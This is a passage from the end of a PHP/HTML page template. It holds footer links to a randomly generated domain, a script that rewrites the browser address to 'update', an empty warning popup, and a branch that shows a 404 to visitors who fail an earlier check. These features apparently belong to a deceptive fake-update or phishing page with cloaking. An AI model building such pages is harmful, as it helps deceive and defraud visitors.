$rand; ?>.com" target="_blank">Terms &amp; Conditions</a> and <a href="https://www.<?php echo $rand; ?>.com" target="_blank">Privacy Policy</a></p>
      </div>
    </div>
  </div>
</div>
</div> 

<script>
window.history.pushState('<?php echo $bert;?>', '<?php echo $bert;?>', 'update');
</script>
<div></div>

</body>
</html>
<style>
.swal2-popup {font-size: 16;}
</style>
<script>
function geo() {
Swal.fire({
  type: 'warning',
})}
</script>
<?php
}else {
header("HTTP/1.0 404 Not Found");	
}
?>